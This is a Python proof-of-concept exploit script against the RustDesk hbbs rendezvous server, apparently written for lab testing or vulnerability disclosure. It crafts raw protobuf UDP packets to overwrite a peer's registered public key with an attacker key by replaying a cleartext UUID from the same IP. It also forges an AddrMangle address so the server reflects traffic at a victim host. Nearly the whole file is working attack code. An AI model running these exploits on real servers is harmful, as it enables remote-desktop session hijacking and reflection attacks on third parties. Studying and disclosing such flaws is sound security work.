#!/usr/bin/env python3
"""RustDesk hbbs live PoCs (run on the lab, hbbs listening on UDP :PORT).
 F-C03: RegisterPk pk-substitution via same-IP && guard bypass (+ wrong-uuid rejection contrast).
 F-S04: unauthenticated UDP reflector via forged AddrMangle destination.
Raw protobuf over UDP (UDP path = tokio_util passthrough codec = raw protobuf, no length prefix)."""
import socket, sys, time, sqlite3, struct, os

HBBS_HOST = os.environ.get("HBBS_HOST", "127.0.0.1")
PORT      = int(os.environ.get("HBBS_PORT", "21116"))
DB        = os.environ.get("DB_PATH", "/tmp/rd-server-lab/db_v2.sqlite3")

# ---- minimal protobuf wire encoder ----
def varint(n):
    o=b''
    while True:
        b=n&0x7f; n>>=7
        o+=bytes([b|0x80]) if n else bytes([b])
        if not n: return o
def ld(field, data):            # length-delimited (wire type 2)
    return varint((field<<3)|2)+varint(len(data))+data
def pstr(field, s):  return ld(field, s.encode())
def pbytes(field, b): return ld(field, b)

# RegisterPk{id=1 str, uuid=2 bytes, pk=3 bytes};  RendezvousMessage.register_pk = field 15
def msg_register_pk(id_, uuid, pk):
    return ld(15, pstr(1,id_)+pbytes(2,uuid)+pbytes(3,pk))
# PunchHoleSent{socket_addr=1 bytes, id=2 str};    RendezvousMessage.punch_hole_sent = field 10
def msg_punch_hole_sent(socket_addr, id_="x"):
    return ld(10, pbytes(1,socket_addr)+pstr(2,id_))

def addrmangle_encode_v4(ip, port):   # tm=0 form: number=(ip_u32<<49)|port
    ip_u32 = struct.unpack("<I", socket.inet_aton(ip))[0]
    number = (ip_u32 << 49) | port
    return number.to_bytes(16, "little")

def send(pkt):
    s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(pkt, (HBBS_HOST, PORT)); s.close()

def db_pk(id_):
    try:
        c=sqlite3.connect(DB); r=c.execute("select hex(pk) from peer where id=?", (id_,)).fetchone(); c.close()
        return r[0] if r else None
    except Exception as e:
        return f"<db-err {e}>"

def hexb(b): return b.hex()

def poc_fc03():
    print("\n===== F-C03: RegisterPk pk-substitution (same-IP && guard bypass) =====")
    ID="poc12345"; UUID=b"UUID-VICTIM-SECRET-ONWIRE"  # uuid is sent in cleartext -> on-path sniffable
    PK_LEGIT=b"\x11"*32; PK_ATTACKER=b"\xAA"*32; PK_X=b"\xCC"*32
    print(f"[*] legit register: id={ID} pk={hexb(PK_LEGIT)[:16]}..")
    send(msg_register_pk(ID, UUID, PK_LEGIT)); time.sleep(1.0)
    a=db_pk(ID); print(f"    stored pk after legit : {a}")
    print(f"[*] ATTACKER register (same source IP, SAME uuid, attacker pk={hexb(PK_ATTACKER)[:16]}..)")
    send(msg_register_pk(ID, UUID, PK_ATTACKER)); time.sleep(1.0)
    b=db_pk(ID); print(f"    stored pk after attack: {b}")
    overwritten = (b and b.lower()==hexb(PK_ATTACKER))
    print(f"[{'VULNERABLE' if overwritten else 'safe'}] pk overwritten by same-IP attacker: {overwritten}")
    # contrast: wrong uuid must be rejected (proves uuid gate is the ONLY thing, bypassed by same-IP)
    time.sleep(7)  # reset reg_pk throttle (>6s)
    print(f"[*] control: register with WRONG uuid (expect REJECT, pk unchanged)")
    send(msg_register_pk(ID, b"WRONG-UUID-DIFFERENT", PK_X)); time.sleep(1.0)
    c=db_pk(ID); print(f"    stored pk after wrong-uuid: {c}  (rejected if == attacker pk)")
    rejected = (c and c.lower()==hexb(PK_ATTACKER))
    print(f"[{'CONFIRMS-GATE' if rejected else 'unexpected'}] wrong-uuid rejected: {rejected}")
    return overwritten

def poc_fs04():
    print("\n===== F-S04: unauthenticated UDP reflector (forged AddrMangle) =====")
    # victim = a UDP listener; attacker asks hbbs to send a PunchHoleResponse to it.
    victim=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); victim.bind(("127.0.0.1",0))
    vip,vport=victim.getsockname(); print(f"[*] victim listener at {vip}:{vport} (never contacts hbbs)")
    victim.settimeout(3.0)
    sa=addrmangle_encode_v4(vip, vport)
    print(f"[*] attacker -> hbbs: PunchHoleSent{{socket_addr=AddrMangle({vip}:{vport})}}")
    send(msg_punch_hole_sent(sa))
    try:
        data,src=victim.recvfrom(4096)
        print(f"[VULNERABLE] victim received {len(data)} bytes reflected from hbbs {src}: {data[:24].hex()}..")
        got=True
    except socket.timeout:
        print("[safe] victim received nothing (no reflection)"); got=False
    victim.close(); return got

if __name__=="__main__":
    print(f"target hbbs {HBBS_HOST}:{PORT}  db={DB}")
    r1=poc_fc03(); r2=poc_fs04()
    print(f"\n=== SUMMARY ===\nF-C03 pk-substitution: {'VULNERABLE' if r1 else 'not-repro'}\nF-S04 reflector      : {'VULNERABLE' if r2 else 'not-repro'}")
